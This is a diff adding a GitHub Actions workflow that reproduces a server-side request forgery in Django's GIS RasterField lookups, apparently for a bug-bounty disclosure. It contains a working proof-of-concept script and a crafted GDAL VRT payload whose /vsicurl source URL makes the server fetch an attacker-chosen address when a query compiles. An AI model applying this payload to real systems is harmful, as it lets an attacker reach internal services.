@@ -1,0 +1,147 @@
+name: Django QuerySet VRT bytes SSRF PoC
+
+on:
+  push:
+    branches:
+      - h1-django-gdal-vrt-bytes-ssrf
+  workflow_dispatch:
+
+jobs:
+  queryset-poc:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        django_ref:
+          - stable/5.2.x
+          - stable/6.0.x
+          - stable/6.1.x
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.13"
+      - name: Install GDAL/GEOS
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y gdal-bin libgdal-dev libgeos-dev
+      - name: Install Django branch
+        run: |
+          python -m pip install -U pip
+          python -m pip install "Django @ git+https://github.com/django/django.git@${{ matrix.django_ref }}" "psycopg[binary]"
+      - name: Run public QuerySet API reproduction
+        env:
+          DJANGO_SETTINGS_MODULE: poc_settings
+        run: |
+          cat > poc_settings.py <<'PY'
+          SECRET_KEY = "poc"
+          ALLOWED_HOSTS = ["testserver"]
+          INSTALLED_APPS = ["django.contrib.contenttypes", "django.contrib.gis"]
+          DATABASES = {
+              "default": {
+                  "ENGINE": "django.contrib.gis.db.backends.postgis",
+                  "NAME": "unused",
+              }
+          }
+          PY
+
+          cat > queryset_poc.py <<'PY'
+          import threading
+          from http.server import BaseHTTPRequestHandler, HTTPServer
+
+          import django
+          django.setup()
+
+          from django.contrib.gis.db import models
+          from django.contrib.gis.gdal import GDALRaster
+          from django.test import RequestFactory
+
+          print("DJANGO_VERSION=", django.get_version())
+
+          class RasterModel(models.Model):
+              rast = models.RasterField(srid=4326)
+
+              class Meta:
+                  app_label = "poc"
+                  managed = False
+                  db_table = "poc_raster"
+
+          hits = []
+
+          src = GDALRaster({
+              "name": "/vsimem/queryset-source.tif",
+              "driver": "GTiff",
+              "width": 1,
+              "height": 1,
+              "srid": 4326,
+              "origin": (0, 1),
+              "scale": (1, -1),
+              "bands": [{"data": [9]}],
+          })
+          src._flush()
+          tiff_bytes = src.vsi_buffer
+
+          class Handler(BaseHTTPRequestHandler):
+              def do_HEAD(self):
+                  hits.append(("HEAD", self.path))
+                  self.send_response(200)
+                  self.send_header("Content-Type", "image/tiff")
+                  self.send_header("Content-Length", str(len(tiff_bytes)))
+                  self.end_headers()
+
+              def do_GET(self):
+                  hits.append(("GET", self.path))
+                  self.send_response(200)
+                  self.send_header("Content-Type", "image/tiff")
+                  self.send_header("Content-Length", str(len(tiff_bytes)))
+                  self.end_headers()
+                  self.wfile.write(tiff_bytes)
+
+              def log_message(self, fmt, *args):
+                  pass
+
+          server = HTTPServer(("127.0.0.1", 18766), Handler)
+          threading.Thread(target=server.serve_forever, daemon=True).start()
+
+          vrt = b"""<VRTDataset rasterXSize="1" rasterYSize="1">
+            <SRS>EPSG:4326</SRS>
+            <GeoTransform>0,1,0,1,0,-1</GeoTransform>
+            <VRTRasterBand dataType="Byte" band="1">
+              <SimpleSource>
+                <SourceFilename relativeToVRT="0">/vsicurl/http://127.0.0.1:18766/source.tif</SourceFilename>
+                <SourceBand>1</SourceBand>
+                <SourceProperties RasterXSize="1" RasterYSize="1" DataType="Byte" BlockXSize="1" BlockYSize="1"/>
+                <SrcRect xOff="0" yOff="0" xSize="1" ySize="1"/>
+                <DstRect xOff="0" yOff="0" xSize="1" ySize="1"/>
+              </SimpleSource>
+            </VRTRasterBand>
+          </VRTDataset>"""
+
+          request = RequestFactory().post(
+              "/lookup",
+              data=vrt,
+              content_type="application/octet-stream",
+          )
+          assert isinstance(request.body, bytes)
+          print("REQUEST_BODY_TYPE=", type(request.body).__name__)
+
+          # Public ORM path: attacker-controlled raw HTTP bytes are supplied as
+          # the RHS of a normal RasterField spatial lookup.
+          queryset = RasterModel.objects.filter(rast__contains=request.body)
+          print("HITS_AFTER_FILTER_CONSTRUCTION=", hits)
+
+          # SQL compilation invokes GISLookup.process_rhs(), which calls
+          # connection.ops.Adapter() -> PostGISAdapter -> to_pgraster() and
+          # reads the VRT source, issuing the outbound request.
+          sql, params = queryset.query.sql_with_params()
+          print("SQL_PREFIX=", sql[:120])
+          print("PARAM_COUNT=", len(params))
+          print("HTTP_HITS_AFTER_SQL_COMPILE=", hits)
+
+          server.shutdown()
+
+          assert any(path == "/source.tif" for _, path in hits), hits
+          print("POC_RESULT=QUERYSET_REQUEST_BODY_SSRF_CONFIRMED")
+          PY
+
+          python queryset_poc.py
